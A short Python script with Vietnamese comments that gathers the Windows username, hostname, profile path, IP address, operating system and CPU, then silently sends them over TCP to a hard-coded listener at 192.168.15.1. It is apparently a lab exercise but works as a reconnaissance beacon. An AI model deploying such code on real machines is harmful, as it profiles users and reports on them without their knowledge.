import socket
import os,platform
from datetime import datetime

SERVER_IP = '192.168.15.1'
SERVER_PORT = 5555
#Ten may
username = os.environ["USERNAME"]
hostname = os.environ["COMPUTERNAME"]
namefile = os.environ["USERPROFILE"]
#Dia chi ipv4
IP = socket.gethostbyname(socket.gethostname())
#Thong tin he dieu hanh (Windows: Windows, Darwin: macOS, Linux: Linux)
hdh = platform.system()
#Thong tin o vi xu ly
cpu = platform.processor()
time = datetime.now()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, SERVER_PORT))
    s.send(f'[{time}] - {username} - {hostname} - {namefile}\nIP: {IP} - HDH: {hdh} - Vi xu ly: {cpu}'.encode('utf-8'))
